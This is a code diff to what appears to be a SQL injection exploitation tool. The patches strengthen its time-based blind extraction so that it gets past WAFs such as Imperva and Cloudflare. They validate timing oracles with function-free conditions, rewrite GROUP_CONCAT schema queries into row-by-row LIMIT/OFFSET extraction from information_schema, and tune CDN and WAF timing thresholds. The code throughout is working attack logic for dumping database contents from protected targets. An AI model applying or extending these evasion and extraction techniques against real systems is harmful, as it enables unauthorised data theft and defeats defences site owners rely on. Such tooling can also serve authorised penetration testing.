@@ -48744,8 +48744,53 @@ class Enumerator:
                         f"BatchExtract with this oracle would produce garbage. "
                         f"Aborting timing-based extraction.", flush=True)
                 if not _tf_valid:
-                    _eval_fn = None  # disarm so "No oracle available" fires below
-                    _oracle_name = "timing_fallback_invalid"
+                    # BUG-NOFUNC-TF-VALIDATE-FIX (HIGH): Standard validation conditions use
+                    # ISNULL(NULL) / ISNULL(1e0) which are function calls. WAFs that block
+                    # ORD(SUBSTRING(...)) often also block ISNULL( — causing both true and
+                    # false probes to return False (WAF-blocked fast response < threshold).
+                    # This incorrectly aborts the timing fallback oracle even though the bypass
+                    # template itself works (confirmed by DP-timing oracle during detection).
+                    # Fix: retry validation with nofunc-compatible conditions (no parentheses):
+                    #   True  → 'a'<'b'  (always true in all DBMSes, no function calls)
+                    #   False → 'a'>'b'  (always false in all DBMSes, no function calls)
+                    # These bypass WAF rules that block identifier( patterns, allowing
+                    # the timing oracle to validate on targets where ISNULL( is blocked.
+                    _tf_nofunc_true  = "'a'<'b'"
+                    _tf_nofunc_false = "'a'>'b'"
+                    _tf_nofunc_discriminates = False
+                    _tf_nofunc_t = None
+                    _tf_nofunc_f = None
+                    for _tf_nf_attempt in range(2):
+                        try:
+                            _tf_nofunc_t = await _timing_eval_fn_tf(_tf_nofunc_true)
+                            _tf_nofunc_f = await _timing_eval_fn_tf(_tf_nofunc_false)
+                            if _tf_nofunc_t is not None and _tf_nofunc_f is not None:
+                                if _tf_nofunc_t != _tf_nofunc_f:
+                                    _tf_nofunc_discriminates = True
+                                    break
+                            if _tf_nf_attempt < 1:
+                                await asyncio.sleep(0.5)
+                        except Exception as _tf_nf_e:
+                            LOG.debug("[_extract_str] nofunc TF validation attempt %d: %s",
+                                      _tf_nf_attempt + 1, _tf_nf_e)
+                    if _tf_nofunc_discriminates:
+                        _tf_valid = True
+                        print(f"[+] [Extract] Timing fallback oracle validated via nofunc conditions "
+                              f"(true={_tf_nofunc_t} false={_tf_nofunc_f}; ISNULL blocked by WAF)",
+                              flush=True)
+                        if _tf_nofunc_t is False and _tf_nofunc_f is True:
+                            _tf_fwd2 = _timing_eval_fn_tf
+                            async def _tf_inv2(cond, _f=_tf_fwd2):
+                                r = await _f(cond)
+                                return (not r) if r is not None else None
+                            _eval_fn = _tf_inv2
+                            _oracle_name = "timing_fallback_nofunc_inverted"
+                        else:
+                            _eval_fn = _timing_eval_fn_tf
+                            _oracle_name = "timing_fallback_nofunc"
+                    else:
+                        _eval_fn = None  # disarm so "No oracle available" fires below
+                        _oracle_name = "timing_fallback_invalid"
 
         if not _eval_fn:
             # All oracle paths exhausted — log clearly and return empty.
@@ -143565,8 +143610,84 @@ async def _time_based_extract_inner(engine, config, result, sql: str,
     _has_func_calls = bool(_re.search(r'\w+\s*\(', _sql_inner))
     _can_nofunc_extract = (_ebf_nofunc_ref[0] and not _has_func_calls)
     if _ebf_nofunc_ref[0] and not _can_nofunc_extract:
-        LOG.warning("[TBExtract] nofunc bypass found but sql=%r has func calls  skipping extraction", sql)
-        return ""  # Skip to next query; orchestrator will try tables/columns instead
+        # BUG-NOFUNC-GC-REWRITE FIX (CRITICAL): In nofunc bypass mode, GROUP_CONCAT/aggregate
+        # SQL queries cannot be used in prefix-comparison conditions since GROUP_CONCAT( is a
+        # function call that WAFs block. Rewrite GROUP_CONCAT queries to LIMIT {offset},1
+        # (MySQL/MariaDB/TiDB) or LIMIT 1 OFFSET {offset} (other DBMSes) enumeration which
+        # requires no function calls in extraction conditions, then join the collected values
+        # with commas to match the expected GROUP_CONCAT output format that callers expect.
+        # Root cause: EBF finds a nofunc bypass for the WAF-blocked target (e.g. Imperva
+        # blocks ORD/SUBSTRING but allows prefix string comparison), but schema/table/column
+        # enumeration queries use GROUP_CONCAT which itself is a function call — the nofunc
+        # guard at line 143567 immediately returned "" for all enumeration queries, silently
+        # skipping all database metadata extraction even when the nofunc bypass works correctly.
+        _gc_col_m = _re.search(r'\bGROUP_CONCAT\s*\(\s*(\w+)', sql, _re.I)
+        _gc_from_m = _re.search(r'\bFROM\s+([\w.`"]+)', sql, _re.I)
+        if _gc_col_m and _gc_from_m:
+            _gc_col   = _gc_col_m.group(1)
+            _gc_table = _gc_from_m.group(1).strip()
+            # Extract WHERE clause, stripping any trailing ORDER BY
+            _gc_where_m = _re.search(r'\bWHERE\s+(.+?)(?:\s+ORDER\s+BY|\s*$)', sql.strip(), _re.I | _re.S)
+            _gc_where_raw = (_gc_where_m.group(1).strip() if _gc_where_m else "")
+            # Rewrite WHERE clause to eliminate function calls:
+            # Split on AND, rewrite or drop each clause that contains a function call.
+            _gc_where_clauses = []
+            if _gc_where_raw:
+                for _gp in _re.split(r'\bAND\b', _gc_where_raw, flags=_re.I):
+                    _gp = _gp.strip()
+                    if _re.search(r'table_schema\s*=\s*DATABASE\s*\(\s*\)', _gp, _re.I):
+                        # Replace table_schema=DATABASE() with NOT-IN-style exclusion using
+                        # != chains (avoids IN(...) which also triggers \w+\s*\( regex).
+                        _gc_where_clauses.append(
+                            "table_schema != 'information_schema'"
+                            " AND table_schema != 'performance_schema'"
+                            " AND table_schema != 'mysql'"
+                            " AND table_schema != 'sys'")
+                    elif not _re.search(r'\w+\s*\(', _gp):
+                        # No function calls in this clause — keep as-is
+                        _gc_where_clauses.append(_gp)
+                    # else: clause has other function calls we cannot rewrite — drop it
+            _gc_where_sql = ("WHERE " + " AND ".join(_gc_where_clauses)) if _gc_where_clauses else ""
+            # ORDER BY: use ordinal_position for column queries (stable sort, no function call),
+            # else use the extracted column itself for deterministic alphabetical ordering.
+            _gc_order = ("ordinal_position"
+                         if "ordinal_position" in sql.lower() and "column" in _gc_col.lower()
+                         else _gc_col)
+            # Build LIMIT-OFFSET row template (no function calls anywhere)
+            _gc_mysql_style = dbms in ("MySQL", "MariaDB", "TiDB")
+            if _gc_mysql_style:
+                _gc_tpl = (f"SELECT {_gc_col} FROM {_gc_table} {_gc_where_sql} "
+                           f"ORDER BY {_gc_order} LIMIT {{offset}},1").strip()
+            else:
+                _gc_tpl = (f"SELECT {_gc_col} FROM {_gc_table} {_gc_where_sql} "
+                           f"ORDER BY {_gc_order} LIMIT 1 OFFSET {{offset}}").strip()
+            # Sanity-check: verify no function calls remain (offset=0 substitution for check)
+            _gc_verify = _gc_tpl.format(offset=0)
+            if not _re.search(r'\w+\s*\(', _gc_verify):
+                print(f"[+] [TBExtract] nofunc GROUP_CONCAT→LIMIT-OFFSET: {_gc_verify[:70]!r}",
+                      flush=True)
+                _gc_items = []
+                _gc_empty_streak = 0
+                for _gc_offset in range(256):  # cap at 256 rows per enumeration call
+                    _gc_row_sql = _gc_tpl.format(offset=_gc_offset)
+                    _gc_item = await _time_based_extract_inner(
+                        engine, config, result, _gc_row_sql,
+                        method, url, data, data_fmt, original, tamper_chain, dbms, baseline)
+                    if not _gc_item or not _gc_item.strip():
+                        _gc_empty_streak += 1
+                        if _gc_empty_streak >= 2:
+                            break
+                        continue
+                    _gc_empty_streak = 0
+                    _gc_items.append(_gc_item.strip())
+                LOG.info("[TBExtract] nofunc LIMIT-OFFSET: %d items for sql=%r",
+                         len(_gc_items), sql[:60])
+                return ",".join(_gc_items)
+            else:
+                LOG.warning("[TBExtract] nofunc GC rewrite still has func calls in: %r",
+                            _gc_verify[:80])
+        LOG.warning("[TBExtract] nofunc bypass found but sql=%r has func calls  skipping", sql)
+        return ""
 
     # BUG-TBEXTRACT-MISSING-LIGHT-VARY FIX: Request counter for apply_light_variation.
     # Initialized once here; incremented inside the inner while loop so every probe
@@ -143946,8 +144067,15 @@ async def _time_based_extract_inner(engine, config, result, sql: str,
                                    # via _is_functional_number timing check. Change to False.
                                    _bypass_mutation=False),
                     timeout=t * 3 + 15)
-                # CDN reactive retry: if CDN-warm (<220ms), wait 30s for TTL expiry
-                if fp is not None and 0 < fp.elapsed_ms < 220:
+                # CDN reactive retry: if CDN-warm (<130ms), wait 30s for TTL expiry.
+                # BUG-CDN-THRESHOLD-FIX (MEDIUM): Old threshold 220ms conflated CDN cache
+                # hits (~50ms) with fast WAF blocks (~100-200ms on Imperva/Cloudflare). When
+                # WAF blocked the extraction condition (e.g. ORD/SUBSTRING pattern), the
+                # 200ms response was misidentified as a CDN hit → unnecessary 30s sleep →
+                # retry → same WAF block → cascade degradation of extraction efficiency.
+                # Lowering to 130ms correctly targets CDN cache responses (typically 5-80ms)
+                # while excluding WAF blocks (typically 100ms+ round-trip).
+                if fp is not None and 0 < fp.elapsed_ms < 130:
                     LOG.info("[TBExtract] CDN-cached probe (%.0fms) — waiting 30s", fp.elapsed_ms)
                     try:
                         await asyncio.sleep(30.0)
@@ -144111,16 +144239,52 @@ async def _time_based_extract_inner(engine, config, result, sql: str,
                   "calibration cache to force re-calibration.", flush=True)
             LOG.warning("[TBExtract] Garbage result discarded (noise_ratio=%.0f%%)", _noise_ratio*100)
             result_str = ""
-            if _cal_key in _TB_CALIBRATION_CACHE:
-                del _TB_CALIBRATION_CACHE[_cal_key]
-            if _cal_key in _TB_EBF_CACHE:
-                del _TB_EBF_CACHE[_cal_key]
+            # BUG-NOFUNC-UPGRADE-FIX (HIGH): Garbage detection requires smart cache decisions.
+            # There are two root causes for garbage:
+            #   Case A: EBF nofunc=False mode, WAF blocks ORD/SUBSTRING extraction conditions.
+            #           Calibration threshold IS valid. Fix: upgrade EBF to nofunc=True and
+            #           PRESERVE calibration cache so next call skips re-calibration and sees
+            #           the upgraded nofunc=True entry without EBF re-running.
+            #   Case B: Standard calibration (no EBF), timing threshold genuinely wrong.
+            #           Fix: clear calibration cache to force re-calibration next call.
+            # Critical: if we delete calibration cache in Case A, re-calibration re-runs EBF,
+            # which may overwrite our nofunc=True upgrade with a fresh nofunc=False entry —
+            # losing the upgrade and causing an infinite garbage loop.
+            _gc_ebf_entry = _TB_EBF_CACHE.get(_cal_key)
+            if _gc_ebf_entry is not None and len(_gc_ebf_entry) > 4 and not _gc_ebf_entry[4]:
+                # Case A: EBF nofunc=False → upgrade to nofunc=True, preserve calibration
+                _gc_upgraded = (_gc_ebf_entry[0], _gc_ebf_entry[1], _gc_ebf_entry[2],
+                                _gc_ebf_entry[3], True)
+                _tb_cache_insert(_TB_EBF_CACHE, _cal_key, _gc_upgraded, _TB_EBF_CACHE_MAX)
+                # Ensure calibration threshold is preserved so next call skips re-calibration
+                # (re-calibration would re-run EBF, overwriting our nofunc=True upgrade)
+                if _cal_key not in _TB_CALIBRATION_CACHE:
+                    _tb_cache_insert(_TB_CALIBRATION_CACHE, _cal_key, timing_thresh,
+                                     _TB_CALIBRATION_CACHE_MAX)
+                LOG.info("[TBExtract] Garbage detected (Case A): EBF upgraded nofunc=False→True "
+                         "(ORD/SUBSTRING WAF-blocked; prefix comparison will be used next)")
+                print("[+] [TBExtract] EBF bypass upgraded to nofunc=True "
+                      "(WAF blocks ORD/SUBSTRING; switching to prefix comparison)", flush=True)
+            else:
+                # Case B: Standard calibration or EBF already nofunc=True → threshold issue.
+                # Clear both caches so next call performs full re-calibration + EBF re-run.
+                if _cal_key in _TB_CALIBRATION_CACHE:
+                    del _TB_CALIBRATION_CACHE[_cal_key]
+                if _cal_key in _TB_EBF_CACHE:
+                    del _TB_EBF_CACHE[_cal_key]
     if not result_str:
         LOG.warning("[TBExtract] empty  increase --time-sec or check network timing")
-        if _cal_key in _TB_EBF_CACHE and _ebf_mode[0]:
-            LOG.info("[TBExtract] EBF cache invalidated (empty  probable rate-limit FP)")
+        # BUG-NOFUNC-EMPTY-PRESERVE-FIX (HIGH): Empty extraction result when EBF mode was
+        # active does NOT mean the bypass template is wrong. For nofunc=True targets, an empty
+        # result typically means the SQL query had function calls that were skipped (GROUP_CONCAT
+        # before BUG-NOFUNC-GC-REWRITE FIX), or the extracted value is genuinely empty. Deleting
+        # the EBF cache forces a re-run that may find a different (weaker) bypass or fail entirely.
+        # Only clear EBF cache when nofunc=False produced empty (meaning the bypass template
+        # itself may be failing, not just the extraction conditions).
+        if _cal_key in _TB_EBF_CACHE and _ebf_mode[0] and not _ebf_nofunc_ref[0]:
+            LOG.info("[TBExtract] EBF cache invalidated (empty result with nofunc=False bypass)")
             del _TB_EBF_CACHE[_cal_key]
-        if _cal_key in _TB_CALIBRATION_CACHE and _ebf_mode[0]:
+        if _cal_key in _TB_CALIBRATION_CACHE and _ebf_mode[0] and not _ebf_nofunc_ref[0]:
             del _TB_CALIBRATION_CACHE[_cal_key]  # force full re-calibration next call
     # Restore original delay
     if _ext_delay is not None:
